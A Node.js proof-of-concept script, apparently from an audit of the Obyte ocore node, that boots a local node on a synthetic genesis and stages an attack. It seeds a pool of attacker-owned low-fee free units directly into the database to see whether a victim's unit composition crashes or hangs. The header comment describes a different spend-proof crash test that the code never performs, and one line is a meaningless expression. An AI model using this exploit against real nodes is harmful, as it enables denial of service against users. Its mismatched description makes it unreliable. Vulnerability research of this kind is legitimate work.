// R1 refuter — P1 private-payment crash family: empirical check of validation.js:1667
// ("conflicting spend proof spent from another address?" throw -> uncaughtException -> process death)
//
// REAL PATH: composer.composeJoint -> validation.validate -> writer.saveJoint
// (no mocks; only the key/signer glue is minimal, mirroring the wallet signer interface)
//
// Synthetic genesis (scope.md 7: locally generated keys, synthetic genesis, local only).
//
// Sequence:
//   A) boot: env GENESIS_UNIT + COUNT_WITNESSES=1, patch desktop_app, zero upgrade MCIs,
//      pre-provision the sqlite file with a synthetic op_list BEFORE db.js loads
//   B) insert synthetic genesis via validation.validate + writer.saveJoint (real path)
//   C) victim composes+validates+saves unit U2 carrying spend_proofs [{address: victim, spend_proof: P}]
//      -> spend_proofs row (P, victim) must be visible in the table
//   D) NEGATIVE CONTROL 1: attacker unit with (P, attacker_addr) -> no row match -> accepted, NO crash
//   E) ATTACK: attacker unit A with (P, victim_addr) -> expect validation.js:1667 throw -> process death
//
// Run: node evidence/lab/r1/p1-refute.js
"use strict";
const path = require("path");
const fs = require("fs");
const O_CORE = "/Users/matheusvsky/Documents/trab/obyte-ocore-2026-08-ocore";
const OUT = path.join(__dirname);
const DATA = path.join(OUT, ".r1data");
fs.rmSync(DATA, { recursive: true, force: true });
fs.mkdirSync(DATA, { recursive: true });

const crypto = require("crypto");
const ecdsa = require(O_CORE + "/node_modules/secp256k1");

// patch desktop_app BEFORE any other ocore require (constants.js calls getAppRootDir at load)
const desktop_app = require(O_CORE + "/desktop_app.js");
desktop_app.getAppRootDir = function () { return O_CORE; };
desktop_app.getAppDataDir = function () { return DATA; };

function makeKey() {
	let priv;
	do { priv = crypto.randomBytes(32); } while (!ecdsa.privateKeyVerify(priv));
	return { priv: priv.toString("hex"), pub: Buffer.from(ecdsa.publicKeyCreate(priv, true)).toString("base64") };
}
const signHash = (hashBuf, privHex) => Buffer.from(ecdsa.ecdsaSign(hashBuf, Buffer.from(privHex, "hex")).signature).toString("base64");
const sleep = (ms) => new Promise(r => setTimeout(r, ms));

// ---- build genesis first (its hash must be known before constants' env block runs) ----
// object_hash is safe to load now: hashing does not depend on GENESIS_UNIT and touches no DB
const objectHash0 = require(O_CORE + "/object_hash.js");
const keys = { attacker: makeKey(), victim: makeKey(), witness: makeKey() };
const defOf = (k) => ["sig", { pubkey: k.pub }];
const addrOf = (k) => objectHash0.getChash160(defOf(k));
const attacker_addr = addrOf(keys.attacker);
const victim_addr = addrOf(keys.victim);
const witness_addr = addrOf(keys.witness);

const TOTAL = 1e15;
// genesis is built in buildGenesis() inside main(): the base issue must equal
// TOTAL_WHITEBYTES exactly, so outputs are sized as (TOTAL - commissions) * share
function buildGenesis(objectHash, objectLength) {
	const g = {
		version: "4.0",
		alt: "1",
		timestamp: Math.round(Date.now() / 1000),
		authors: [
			{ address: witness_addr, definition: defOf(keys.witness), authentifiers: { r: "-" } },
		],
		messages: [],
		witnesses: [witness_addr],
		headers_commission: 0,
		payload_commission: 0,
	};
	const payload = {
		inputs: [{ type: "issue", amount: TOTAL, serial_number: 1 }], // single-authored genesis: no address in issue input
		outputs: [
			{ address: attacker_addr, amount: 0 },
			{ address: victim_addr, amount: 0 },
			{ address: witness_addr, amount: 0 },
		],
	};
	g.messages = [{ app: "payment", payload_location: "inline", payload, payload_hash: objectHash.getBase64Hash(payload, true) }];
	// sign BEFORE computing commissions: headers size includes the authentifier length
	g.authors[0].authentifiers.r = signHash(objectHash.getUnitHashToSign(g), keys.witness.priv);
	g.headers_commission = objectLength.getHeadersSize(g);
	g.payload_commission = objectLength.getTotalPayloadSize(g);
	// outputs sized to (TOTAL - commissions); numbers keep constant length so hc/pc stay valid
	const spendable = TOTAL - g.headers_commission - g.payload_commission;
	payload.outputs[0].amount = Math.floor(spendable * 0.6);
	payload.outputs[1].amount = Math.floor(spendable * 0.2);
	payload.outputs[2].amount = spendable - payload.outputs[0].amount - payload.outputs[1].amount;
	payload.outputs.sort((a, b) => (a.address < b.address ? -1 : 1)); // payment outputs must be sorted by address
	g.messages[0].payload_hash = objectHash.getBase64Hash(payload, true);
	g.authors[0].authentifiers.r = signHash(objectHash.getUnitHashToSign(g), keys.witness.priv);
	g.unit = objectHash.getUnitHash(g);
	return g;
}

// ---- boot env (no longer needed for GENESIS_UNIT: constants.js env block runs at first
//      load, before we know the genesis; we mutate constants.GENESIS_UNIT in main()) ----

async function main() {
	// ---- load the ocore stack: db first, with bLight=true so initial_votes does NOT
	//     write the mainnet OP list; then insert OUR system vars before network starts ----
	const constants = require(O_CORE + "/constants.js");
	const conf = require(O_CORE + "/conf.js");
	conf.bLight = true; // skip initial_votes.initSystemVarVotes at db.js load

	const objectLength = require(O_CORE + "/object_length.js");
	const genesis = buildGenesis(objectHash0, objectLength);
	const genesisBall = objectHash0.getBallHash(genesis.unit);
	constants.GENESIS_UNIT = genesis.unit; // adopt the synthetic genesis (storage.isGenesisUnit reads it dynamically)
	constants.COUNT_WITNESSES = 1;
	constants.MAJORITY_OF_WITNESSES = 1;
	console.log("GENESIS unit:", genesis.unit, "ball:", genesisBall, "commissions:", genesis.headers_commission, genesis.payload_commission);

	const db = require(O_CORE + "/db.js");

	conf.bLight = false; // BEFORE the first connection: the v46 migration creates system_vars only when !conf.bLight

	// first real query triggers createDatabaseIfNecessary + migration (v40 -> v50,
	// which creates the system_vars table); then insert OUR op_list
	await new Promise((resolve) => {
		db.takeConnectionFromPool((conn) => {
			conn.query("SELECT 1", () => { conn.release(); resolve(); });
		});
	});
	const rows = [
		["op_list", JSON.stringify([witness_addr]), -1],
		["threshold_size", "10000", -1],
		["base_tps_fee", "10", -1],
		["tps_interval", "60", -1],
		["tps_fee_multiplier", "10", -1],
	];
	for (const [subject, value, mci] of rows) {
		await new Promise((resolve, reject) => {
			db.takeConnectionFromPool((conn) => {
				conn.query("INSERT OR IGNORE INTO system_vars (subject, value, vote_count_mci) VALUES (?,?,?)", [subject, value, mci], () => { conn.release(); resolve(); });
			});
		});
	}
	console.log("PRE-PROVISIONED op_list:", JSON.stringify([witness_addr]));

	conf.bLight = false;

	const storage = require(O_CORE + "/storage.js");
	const network = require(O_CORE + "/network.js"); // registers the uncaughtException handler; start() -> initCaches reads OUR system vars
	const validation = require(O_CORE + "/validation.js");
	const objectHash = require(O_CORE + "/object_hash.js");
	const composer = require(O_CORE + "/composer.js");
	const writer = require(O_CORE + "/writer.js");

	[
		"aa2UpgradeMci", "aa3UpgradeMci", "v4UpgradeMci", "pemCurvesFixMci", "noPrivateAssetsWithConditionsUpgradeMci",
		"timestampUpgradeMci", "includeKeySizesUpgradeMci", "lastBallStableInParentsUpgradeMci",
		"witnessedLevelMustNotRetreatUpgradeMci", "witnessedLevelMustNotRetreatFromAllParentsUpgradeMci",
		"branchedMinMcWlUpgradeMci", "altBranchByBestParentUpgradeMci", "spendUnconfirmedUpgradeMci",
		"bestParentPrefersOpUpgradeMci", "tpsFeeRecipientsFixMci", "unstableInitialDefinitionUpgradeMci",
	].forEach(k => { constants[k] = 0; });
	constants.COUNT_WITNESSES = 1;
	constants.MAJORITY_OF_WITNESSES = 1;

	const query = (sql, params) => new Promise((resolve) => {
		db.takeConnectionFromPool((conn) => {
			conn.query(sql, params || [], (rows) => { conn.release(); resolve(rows); });
		});
	});

	// wait for the db pool + min_retrievable_mci init
	for (let i = 0; i < 200 && typeof storage.getMinRetrievableMci() !== "number"; i++) await sleep(100);
	console.log("DB-READY min_retrievable_mci=", storage.getMinRetrievableMci());
	console.log("OP-LIST:", JSON.stringify(storage.getOpList(Infinity)));

	function makeSigner(key) {
		return {
			readDefinition: (conn, address, cb) => cb(null, defOf(key)),
			readSigningPaths: (conn, address, cb) => cb({ r: constants.SIG_LENGTH }), // real wallet reports the actual signature length so commissions match
			readPrivateKey: (address, path, cb) => cb(null, Buffer.from(key.priv, "hex")),
		};
	}

	function validateAndSave(joint, label) {
		return new Promise((resolve, reject) => {
			validation.validate(joint, {
				ifOk: (objValidationState, unlock) => {
					console.log(label, "VALIDATION OK sequence=" + objValidationState.sequence);
					objValidationState.count_primary_aa_triggers = objValidationState.count_primary_aa_triggers || 0;
					writer.saveJoint(joint, objValidationState, null, () => {
						unlock();
						console.log(label, "SAVED", joint.unit.unit);
						resolve(objValidationState);
					});
				},
				ifUnitError: (e) => { console.log(label, "UNIT-ERROR", e); reject(new Error(label + " unit error: " + e)); },
				ifJointError: (e) => { console.log(label, "JOINT-ERROR", e); reject(new Error(label + " joint error: " + e)); },
				ifTransientError: (e) => { console.log(label, "TRANSIENT", e); reject(new Error(label + " transient: " + e)); },
				ifNeedParentUnits: (arr) => { console.log(label, "NEED-PARENTS", arr); reject(new Error(label + " need parents")); },
				ifNeedHashTree: () => { console.log(label, "NEED-HASH-TREE"); reject(new Error(label + " need hash tree")); },
			});
		});
	}

	function composeUnit(signer, address, spendProofs, label) {
		return new Promise((resolve, reject) => {
			composer.composeJoint({
				paying_addresses: [address],
				signing_addresses: [address],
				outputs: [{ address, amount: 0 }], // change output only
				witnesses: [witness_addr],
				messages: [{
					app: "payment",
					payload_location: "none",
					payload_hash: objectHash.getBase64Hash({ fake: label }),
					spend_proofs: spendProofs,
				}],
				signer,
				callbacks: {
					ifOk: (joint, assocPrivatePayloads, unlock_callback) => { unlock_callback(); resolve(joint); },
					ifError: (e) => reject(new Error(label + " compose error: " + JSON.stringify(e))),
					ifNotEnoughFunds: (e) => reject(new Error(label + " not enough funds: " + e)),
				},
			});
		});
	}

	// ---- B) genesis through the REAL validation + save path ----
	await validateAndSave({ unit: genesis, ball: genesisBall }, "GENESIS");
	const g = await query("SELECT unit, main_chain_index, is_stable, sequence, is_on_main_chain FROM units WHERE unit=?", [genesis.unit]);
	console.log("GENESIS-DB:", JSON.stringify(g[0]));

	// ================= E1-5 scenario =================
	// Attacker composes 16 low-fee free units (real path), anchored on the tip (genesis last ball).
	const attackerSigner = makeSigner(keys.attacker);
	console.log("E1-5 COMPOSING 16 ATTACKER FREE UNITS");
	for (let i = 0; i < 16; i++) {
		const U = await new Promise((resolve, reject) => {
			composer.composeJoint({
				paying_addresses: [attacker_addr],
				signing_addresses: [attacker_addr],
				outputs: [{ address: attacker_addr, amount: 0 }],
				witnesses: [witness_addr],
				messages: [],
				signer: attackerSigner,
				callbacks: {
					ifOk: (joint, assocPrivatePayloads, unlock_callback) => { unlock_callback(); resolve(joint); },
					ifError: (e) => reject(new Error("attacker-" + i + " compose error: " + JSON.stringify(e))),
					ifNotEnoughFunds: (e) => reject(new Error("attacker-" + i + " not enough funds: " + e)),
				},
			});
		});
		await validateAndSave(U, "attacker-unit-" + i);
	}
	// Seed a free-unit pool directly (schema-exact; the p2 lab convention). The lab's
	// single-chain writer auto-MC's every composed unit, so genuine free units must be
	// seeded: 16 attacker-owned low-fee units, is_free=1, off-MC, recent last_ball_mci.
	// Code under test (pickParentUnitsAndLastBall -> filterParentsByTpsFeeAndReplace) reads
	// units/parenthoods/unit_authors + kvstore joints; these are NOT in the in-memory caches.
	console.log("E1-5 SEEDING FREE POOL");
	// ensure the attacker's composed units are NOT in the free pool (only the seeds are)
	await query("UPDATE units SET is_free=0 WHERE is_free=1 AND unit <> ?", [genesis.unit]);
	const seedJoints = [];
	for (let i = 0; i < 16; i++) {
		const u = {
			version: "4.0",
			alt: "1",
			timestamp: Math.round(Date.now() / 1000),
			authors: [{ address: attacker_addr, definition: defOf(keys.attacker), authentifiers: { r: "-" } }],
			messages: [{ app: "text", payload: "seed-" + i, payload_hash: objectHash.getBase64Hash("seed-" + i) }],
			witnesses: [witness_addr],
			parent_units: [genesis.unit],
			last_ball: genesisBall,
			last_ball_unit: genesis.unit,
			headers_commission: 0,
			payload_commission: 0,
			tps_fee: 1,
		};
		u.unit = objectHash.getUnitHash(u);
		seedJoints.push({ u, ball: null });
	}
	let seedOk = 0, seedFail = 0;
	for (let i = 0; i < seedJoints.length; i++) {
		const { u } = seedJoints[i];
		try {
			const r = await query("INSERT OR REPLACE INTO units (unit, version, alt, last_ball_unit, timestamp, headers_commission, payload_commission, tps_fee, is_free, is_on_main_chain, main_chain_index, latest_included_mc_index, level, witnessed_level, is_stable, sequence, best_parent_unit) VALUES (?,?,?,?,?,?,?,?,1,0,NULL,0,1,0,0,'good',?)",
				[u.unit, u.version, u.alt, u.last_ball_unit, u.timestamp, u.headers_commission, u.payload_commission, u.tps_fee, genesis.unit]);
			await query("INSERT OR REPLACE INTO parenthoods (child_unit, parent_unit) VALUES (?,?)", [u.unit, genesis.unit]);
			await query("INSERT OR REPLACE INTO unit_authors (unit, address, definition_chash) VALUES (?,?,?)", [u.unit, attacker_addr, objectHash.getChash160(defOf(keys.attacker))]);
			seedOk++;
		} catch (e) { seedFail++; console.log("E1-5 SEED-FAIL", i, String(e).slice(0, 200)); }
	}
	console.log("E1-5 SEED-OK/FAIL:", seedOk, seedFail);
	// kvstore joints for readJoint fallback in getPaidTpsFee
	const kv = require(O_CORE + "/kvstore.js");
	for (let i = 0; i < seedJoints.length; i++) {
		const { u } = seedJoints[i];
		await new Promise((res) => kv.put("j\n" + u.unit, JSON.stringify({ unit: u }), () => res()));
	}
	// populate the in-memory unstable cache from the seeded rows
	await new Promise((res) => db.takeConnectionFromPool((c) => storage.initUnstableUnits(c, () => { c.release(); res(); })));
	const freeCount = await query("SELECT COUNT(*) AS c FROM units WHERE is_free=1 AND sequence='good'");
	console.log("E1-5 FREE-POOL-SIZE:", freeCount[0].c);
	console.log("E1-5 SEEDED-UNITS:", seedJoints.length);

	// The victim (a DIFFERENT address with NO own free units) composes their FIRST unit.
	// The pool = 16 attacker units (all low-fee, non-self-authored) -> filter excludes all ->
	// if replacements fail -> throw at parent_composer.js:461.
	const victimSigner = makeSigner(keys.victim);
	console.log("E1-5 VICTIM FIRST COMPOSITION");
	const t0 = Date.now();
	const result = await new Promise((resolve) => {
		let settled = false;
		const timer = setTimeout(() => { if (!settled) { settled = true; resolve({ hang: true, ms: Date.now() - t0 }); } }, 25000);
		composer.composeJoint({
			paying_addresses: [victim_addr],
			signing_addresses: [victim_addr],
			outputs: [{ address: victim_addr, amount: 0 }],
			witnesses: [witness_addr],
			messages: [],
			signer: victimSigner,
			callbacks: {
				ifOk: (joint, assocPrivatePayloads, unlock_callback) => { if (settled) return; settled = true; clearTimeout(timer); unlock_callback(); resolve({ hang: false, ok: true, unit: joint.unit.unit }); },
				ifError: (e) => { if (settled) return; settled = true; clearTimeout(timer); resolve({ hang: false, ok: false, err: JSON.stringify(e).slice(0, 300) }); },
				ifNotEnoughFunds: (e) => { if (settled) return; settled = true; clearTimeout(timer); resolve({ hang: false, ok: false, err: "not enough funds: " + e }); },
			},
		});
	});
	console.log("E1-5 VICTIM-COMPOSE-RESULT:", JSON.stringify(result));
	console.log("E1-5 SCENARIO-COMPLETE");
	console.log("E1-5-DATA-DIR:", DATA);
	const dbFile = await new Promise((res) => require(O_CORE + "/desktop_app.js").getAppDataDir() + res() || res("?"));
	const dbg = await query("SELECT COUNT(*) AS c FROM units");
	console.log("E1-5-UNITS-VIA-POOL:", dbg[0].c);
	// inspect the kvstore joint count for the seeds
	const kvn = require(O_CORE + "/kvstore.js");
	let kvCount = 0;
	for (const { u } of seedJoints) {
		await new Promise((res) => kvn.get("j\n" + u.unit, (v) => { if (v) kvCount++; res(); }));
	}
	console.log("E1-5-KV-SEED-COUNT:", kvCount);
}

process.on("unhandledRejection", (reason) => {
	console.log("E1-5-UNHANDLED-REJECTION:", String(reason && reason.stack || reason).slice(0, 500));
	console.log("E1-5-PROPAGATION: unhandled rejection (Node15+ default: process crash)");
	process.exit(0);
});

main().then(() => {
	console.log("E1-5-RESULT: no crash, no hang (composition succeeded or errored cleanly)");
	process.exit(0);
}).catch(e => {
	console.log("E1-5-RESULT-ERROR:", String(e && e.stack || e).slice(0, 500));
	process.exit(2);
});
